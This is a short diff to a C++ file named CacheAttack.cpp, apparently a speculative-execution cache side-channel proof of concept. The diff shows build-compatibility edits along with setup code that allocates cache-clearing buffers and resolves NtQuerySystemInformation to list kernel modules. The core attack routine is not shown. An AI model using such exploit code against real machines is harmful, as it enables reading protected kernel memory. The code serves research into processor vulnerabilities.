@@ -1,11 +1,12 @@
 // CacheAttack.cpp : Defines the entry point for the console application.
 // by @pwnallthethings
 
-#include "stdafx.h"
+// #include "stdafx.h"
+#include <stdio.h>
 #include <Windows.h>
 
-EXTERN_C_START
-
+//EXTERN_C_START
+extern "C" {
 void _run_attempt();
 DWORD64 pointers[4096 / 2];
 DWORD64* speculative;
@@ -13,8 +14,8 @@ DWORD64* speculative;
 BYTE*    L2_cache_clear;
 
 DWORD64 times[256];
-
-EXTERN_C_END
+}
+//EXTERN_C_END
 
 typedef NTSTATUS (WINAPI *pNtQuerySystemInformation)(
 	_In_      DWORD SystemInformationClass,
@@ -111,7 +112,7 @@ int main()
 
 	L2_cache_clear = (BYTE*)VirtualAlloc(0, 256 * 4096, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_WRITECOMBINE);
 
-	(*(FARPROC*)&NtQuerySystemInformation) = GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
+	(*(FARPROC*)&NtQuerySystemInformation) = GetProcAddress(LoadLibrary("ntdll.dll"), "NtQuerySystemInformation");
 
 	SYSTEM_MODULE_INFORMATION modInfo = { 0 };
 	DWORD dw;
